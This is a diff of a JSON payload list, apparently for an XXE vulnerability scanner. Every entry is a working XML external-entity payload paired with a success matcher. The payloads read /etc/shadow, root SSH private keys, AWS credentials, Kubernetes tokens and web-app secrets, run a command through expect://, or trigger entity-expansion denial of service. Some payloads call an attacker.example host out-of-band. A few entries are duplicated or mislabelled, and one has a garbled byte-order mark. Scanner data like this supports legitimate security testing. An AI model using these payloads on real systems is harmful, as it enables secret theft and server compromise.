@@ -1,36 +1,418 @@
 [
-  {"name": "classic_passwd",        "category": "classic",         "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><root>&x;</root>", "matcher": "root:[x*]?:0:0"},
-  {"name": "classic_passwd_norm",   "category": "classic",         "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY foo SYSTEM \"file:///etc/passwd\">]>\n<foo>&foo;</foo>", "matcher": "root:[x*]?:0:0"},
-  {"name": "classic_hosts",         "category": "classic",         "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/hosts\">]><root>&x;</root>", "matcher": "127\\.0\\.0\\.1\\s+localhost"},
-  {"name": "classic_environ",       "category": "classic",         "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///proc/self/environ\">]><root>&x;</root>", "matcher": "(HTTP_|PATH=|HOSTNAME=)"},
-  {"name": "classic_cmdline",       "category": "classic",         "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///proc/self/cmdline\">]><root>&x;</root>", "matcher": "(/usr/|/bin/|--port)"},
-  {"name": "classic_win_ini",       "category": "classic",         "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///C:/Windows/win.ini\">]><root>&x;</root>", "matcher": "\\[fonts\\]"},
-  {"name": "classic_apache_conf",   "category": "classic",         "severity": "HIGH",     "cvss": "8.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/apache2/apache2.conf\">]><root>&x;</root>", "matcher": "(ServerRoot|DocumentRoot)"},
-  {"name": "classic_nginx_conf",    "category": "classic",         "severity": "HIGH",     "cvss": "8.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/nginx/nginx.conf\">]><root>&x;</root>", "matcher": "(server\\s*\\{|http\\s*\\{)"},
-  {"name": "classic_ssh_key",       "category": "classic",         "severity": "CRITICAL", "cvss": "9.8", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///root/.ssh/id_rsa\">]><root>&x;</root>", "matcher": "-----BEGIN .*PRIVATE KEY-----"},
-
-  {"name": "parameter_ent",         "category": "parameter-ent",   "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?d=%file;'>\">%eval;%exfil;]><root></root>", "matcher": "root:[x*]?:0:0"},
-  {"name": "parameter_ent_local",   "category": "parameter-ent",   "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY c '%a;'>\">%b;]><root>&c;</root>", "matcher": "root:[x*]?:0:0"},
-
-  {"name": "xinclude_passwd",       "category": "xinclude",        "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></root>", "matcher": "root:[x*]?:0:0"},
-  {"name": "xinclude_hosts",        "category": "xinclude",        "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/hosts\"/></root>", "matcher": "127\\.0\\.0\\.1\\s+localhost"},
-
-  {"name": "svg_passwd",            "category": "svg",             "severity": "HIGH",     "cvss": "8.1", "body": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&x;</text></svg>", "matcher": "root:[x*]?:0:0"},
-  {"name": "svg_hosts",             "category": "svg",             "severity": "HIGH",     "cvss": "8.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/hosts\">]><svg><text>&x;</text></svg>", "matcher": "127\\.0\\.0\\.1\\s+localhost"},
-
-  {"name": "soap_passwd",           "category": "soap",            "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>&x;</test></soap:Body></soap:Envelope>", "matcher": "root:[x*]?:0:0"},
-
-  {"name": "json_xml_passwd",       "category": "json-xml",        "severity": "CRITICAL", "cvss": "9.1", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><root>&x;</root>", "matcher": "root:[x*]?:0:0"},
-
-  {"name": "utf16_passwd",          "category": "utf16",           "severity": "CRITICAL", "cvss": "9.1", "body": "ÿþ<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><root>&x;</root>", "matcher": "root:[x*]?:0:0"},
-
-  {"name": "docx_content_passwd",   "category": "docx",            "severity": "HIGH",     "cvss": "7.5", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body>&x;</w:body></w:document>", "matcher": "root:[x*]?:0:0"},
-
-  {"name": "blind_oob_check",       "category": "blind-oob",       "severity": "HIGH",     "cvss": "7.5", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.example/x\">%remote;]><root></root>", "matcher": "(?!.*)"},
-  {"name": "blind_oob_dns",         "category": "blind-oob",       "severity": "HIGH",     "cvss": "7.5", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % a SYSTEM \"http://detect.attacker.example/dtd\">%a;]><root></root>", "matcher": "(?!.*)"},
-
-  {"name": "dos_billion_laughs",    "category": "dos",             "severity": "HIGH",     "cvss": "7.5", "body": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\">]><lolz>&lol3;</lolz>", "matcher": "(?!.*)"},
-
-  {"name": "schema_validation",     "category": "classic",         "severity": "MEDIUM",   "cvss": "5.3", "body": "<?xml version=\"1.0\"?><!DOCTYPE root SYSTEM \"http://attacker.example/dtd\"><root></root>", "matcher": "(?!.*)"},
-  {"name": "external_dtd_load",     "category": "classic",         "severity": "MEDIUM",   "cvss": "5.3", "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM \"http://attacker.example/external.dtd\">%dtd;]><root></root>", "matcher": "(?!.*)"}
+  {
+    "name": "classic_passwd",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><root>&x;</root>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "classic_passwd_norm",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><root>&x;</root>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "classic_shadow",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/shadow\">]><root>&x;</root>",
+    "matcher": "root:\\$\\d+\\$"
+  },
+  {
+    "name": "classic_hosts",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/hosts\">]><root>&x;</root>",
+    "matcher": "127\\.0\\.0\\.1\\s+localhost"
+  },
+  {
+    "name": "classic_environ",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///proc/self/environ\">]><root>&x;</root>",
+    "matcher": "(HTTP_|PATH=|HOSTNAME=)"
+  },
+  {
+    "name": "classic_cmdline",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///proc/self/cmdline\">]><root>&x;</root>",
+    "matcher": "(/usr/|/bin/|--port)"
+  },
+  {
+    "name": "classic_win_ini",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///C:/Windows/win.ini\">]><root>&x;</root>",
+    "matcher": "\\[fonts\\]"
+  },
+  {
+    "name": "classic_apache_conf",
+    "category": "classic",
+    "severity": "HIGH",
+    "cvss": "8.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/apache2/apache2.conf\">]><root>&x;</root>",
+    "matcher": "(ServerRoot|DocumentRoot)"
+  },
+  {
+    "name": "classic_nginx_conf",
+    "category": "classic",
+    "severity": "HIGH",
+    "cvss": "8.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/nginx/nginx.conf\">]><root>&x;</root>",
+    "matcher": "(server\\s*\\{|http\\s*\\{)"
+  },
+  {
+    "name": "classic_ssh_key",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///root/.ssh/id_rsa\">]><root>&x;</root>",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  },
+  {
+    "name": "classic_resolv",
+    "category": "classic",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/resolv.conf\">]><root>&x;</root>",
+    "matcher": "nameserver\\s+\\d+\\."
+  },
+  {
+    "name": "classic_issue",
+    "category": "classic",
+    "severity": "LOW",
+    "cvss": "3.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/issue\">]><root>&x;</root>",
+    "matcher": "(Ubuntu|Debian|CentOS|Alpine)"
+  },
+  {
+    "name": "classic_k8s_token",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///run/secrets/kubernetes.io/serviceaccount/token\">]><root>&x;</root>",
+    "matcher": "ey[A-Za-z0-9_-]+\\.ey"
+  },
+  {
+    "name": "classic_aws_creds",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///root/.aws/credentials\">]><root>&x;</root>",
+    "matcher": "aws_access_key_id"
+  },
+  {
+    "name": "classic_passwd_php_filter",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&x;</root>",
+    "matcher": ".+"
+  },
+  {
+    "name": "classic_expect",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"expect://id\">]><root>&x;</root>",
+    "matcher": "uid=\\d+"
+  },
+  {
+    "name": "classic_passwd_named",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY foo SYSTEM \"file:///etc/passwd\">]>\n<foo>&foo;</foo>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "classic_passwd_nodoctype_attr",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data attr=\"&file;\">x</data>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "param_ent_local",
+    "category": "parameter-ent",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY c '%a;'>\">%b;]><root>&c;</root>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "param_ent_local_hosts",
+    "category": "parameter-ent",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % a SYSTEM \"file:///etc/hosts\"><!ENTITY % b \"<!ENTITY c '%a;'>\">%b;]><root>&c;</root>",
+    "matcher": "127\\.0\\.0\\.1\\s+localhost"
+  },
+  {
+    "name": "param_ent_local_environ",
+    "category": "parameter-ent",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % a SYSTEM \"file:///proc/self/environ\"><!ENTITY % b \"<!ENTITY c '%a;'>\">%b;]><root>&c;</root>",
+    "matcher": "(HTTP_|PATH=|HOSTNAME=)"
+  },
+  {
+    "name": "param_ent_php_b64",
+    "category": "parameter-ent",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % a SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % b \"<!ENTITY c '%a;'>\">%b;]><root>&c;</root>",
+    "matcher": ".+"
+  },
+  {
+    "name": "xinclude_passwd",
+    "category": "xinclude",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></root>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "xinclude_hosts",
+    "category": "xinclude",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/hosts\"/></root>",
+    "matcher": "127\\.0\\.0\\.1\\s+localhost"
+  },
+  {
+    "name": "xinclude_environ",
+    "category": "xinclude",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///proc/self/environ\"/></root>",
+    "matcher": "(HTTP_|PATH=|HOSTNAME=)"
+  },
+  {
+    "name": "xinclude_win_ini",
+    "category": "xinclude",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///C:/Windows/win.ini\"/></root>",
+    "matcher": "\\[fonts\\]"
+  },
+  {
+    "name": "svg_passwd",
+    "category": "svg",
+    "severity": "HIGH",
+    "cvss": "8.1",
+    "body": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&x;</text></svg>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "svg_hosts",
+    "category": "svg",
+    "severity": "HIGH",
+    "cvss": "8.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/hosts\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&x;</text></svg>",
+    "matcher": "127\\.0\\.0\\.1\\s+localhost"
+  },
+  {
+    "name": "svg_environ",
+    "category": "svg",
+    "severity": "HIGH",
+    "cvss": "8.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///proc/self/environ\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&x;</text></svg>",
+    "matcher": "(HTTP_|PATH=|HOSTNAME=)"
+  },
+  {
+    "name": "soap_passwd",
+    "category": "soap",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>&x;</test></soap:Body></soap:Envelope>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "soap12_passwd",
+    "category": "soap",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Body><test>&x;</test></soap:Body></soap:Envelope>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "json_xml_passwd",
+    "category": "json-xml",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><root>&x;</root>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "json_xml_hosts",
+    "category": "json-xml",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/hosts\">]><root>&x;</root>",
+    "matcher": "127\\.0\\.0\\.1\\s+localhost"
+  },
+  {
+    "name": "utf16_passwd",
+    "category": "utf16",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "ÿþ<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><root>&x;</root>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "utf7_passwd",
+    "category": "utf16",
+    "severity": "HIGH",
+    "cvss": "8.1",
+    "body": "<?xml version=\"1.0\" encoding=\"UTF-7\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><root>&x;</root>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "docx_content_passwd",
+    "category": "docx",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body>&x;</w:body></w:document>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "xlsx_content_passwd",
+    "category": "docx",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData>&x;</sheetData></worksheet>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "blind_oob_check",
+    "category": "blind-oob",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.example/x\">%remote;]><root></root>",
+    "matcher": "(?!.*)"
+  },
+  {
+    "name": "blind_oob_dns",
+    "category": "blind-oob",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % a SYSTEM \"http://detect.attacker.example/dtd\">%a;]><root></root>",
+    "matcher": "(?!.*)"
+  },
+  {
+    "name": "dos_billion_laughs",
+    "category": "dos",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
+    "matcher": "(?!.*)"
+  },
+  {
+    "name": "classic_php_config",
+    "category": "classic",
+    "severity": "HIGH",
+    "cvss": "8.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///var/www/html/config.php\">]><root>&x;</root>",
+    "matcher": "<\\?php"
+  },
+  {
+    "name": "classic_wpconfig",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///var/www/html/wp-config.php\">]><root>&x;</root>",
+    "matcher": "(DB_PASSWORD|<\\?php)"
+  },
+  {
+    "name": "classic_env",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///var/www/html/.env\">]><root>&x;</root>",
+    "matcher": "(APP_KEY|DB_PASSWORD|SECRET)"
+  },
+  {
+    "name": "classic_proc_status",
+    "category": "classic",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///proc/self/status\">]><root>&x;</root>",
+    "matcher": "(Name:|Pid:|Uid:)"
+  },
+  {
+    "name": "classic_proc_version",
+    "category": "classic",
+    "severity": "MEDIUM",
+    "cvss": "5.3",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///proc/version\">]><root>&x;</root>",
+    "matcher": "(Linux version|gcc)"
+  },
+  {
+    "name": "classic_authlog",
+    "category": "classic",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///var/log/auth.log\">]><root>&x;</root>",
+    "matcher": "(sshd|Accepted|Failed)"
+  },
+  {
+    "name": "classic_dockerenv",
+    "category": "classic",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///.dockerenv\">]><root>&x;</root>",
+    "matcher": "."
+  },
+  {
+    "name": "classic_cgroup",
+    "category": "classic",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///proc/1/cgroup\">]><root>&x;</root>",
+    "matcher": "(docker|kubepods)"
+  },
+  {
+    "name": "classic_win_sam_sys",
+    "category": "classic",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///C:/Windows/System32/config/SYSTEM\">]><root>&x;</root>",
+    "matcher": ".+"
+  },
+  {
+    "name": "classic_web_config",
+    "category": "classic",
+    "severity": "HIGH",
+    "cvss": "8.1",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///C:/inetpub/wwwroot/web.config\">]><root>&x;</root>",
+    "matcher": "(<configuration>|<connectionStrings>)"
+  },
+  {
+    "name": "xinclude_xpointer_passwd",
+    "category": "xinclude",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "body": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\" xpointer=\"xpointer(/*)\"/></root>",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "name": "svg_ssh_key",
+    "category": "svg",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///root/.ssh/id_rsa\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&x;</text></svg>",
+    "matcher": "-----BEGIN .*PRIVATE KEY-----"
+  }
 ]
